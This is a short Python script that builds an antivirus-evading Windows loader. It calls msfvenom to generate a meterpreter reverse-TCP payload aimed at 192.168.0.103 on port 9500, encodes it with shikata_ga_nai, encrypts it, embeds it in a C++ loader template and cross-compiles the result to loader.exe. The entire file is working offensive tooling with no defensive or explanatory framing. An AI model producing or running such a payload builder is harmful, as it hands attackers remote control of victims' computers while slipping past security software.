from insert_code import insert_payload
from encrypt import encrypt
import subprocess as sb

LHOST = '192.168.0.103'

LPORT = '9500'

RAW_CODE_FILE = 'reverse_tcp_raw.txt'

ENCODED_CODE_FILE = 'reverse_tcp_enc.txt'

ENCRYPTED_CODE_FILE = "reverse_tcp_encr.txt"
KEY = 'x'

LOADER_TEMPLATE = 'payload_deployer.cpp.template'

GEN_CODE = 'payload_deployer_gen.cpp'

LOADER_EXE = 'loader.exe'


print('Creating payload using msfvenom...')

payload_creator = sb.Popen(["msfvenom",
                            "-p", "windows/x64/meterpreter_reverse_tcp",
                            "-e", "x86/shikata_ga_nai",
                            "-i", "2",
                            f'LHOST={LHOST}',
                            f'LPORT={LPORT}',
                            "-f", "raw",
                            "-o", RAW_CODE_FILE])

if payload_creator.wait() != 0:
    print('Error creating MSF payload')
    exit(-1)

print('Encrypting payload...')

encrypt(RAW_CODE_FILE, ENCRYPTED_CODE_FILE, KEY)

print('Inserting payload into loader...')

insert_payload(ENCRYPTED_CODE_FILE, KEY, LOADER_TEMPLATE, GEN_CODE)

print('Compiling generated code...')

compiler = sb.Popen(["x86_64-w64-mingw32-g++", GEN_CODE,
                     '-o', LOADER_EXE,  '-static', '-lpthread'])

if compiler.wait() != 0:
    print('Error compiling generated code!')
    exit(-1)

print('Loader generated at', LOADER_EXE)
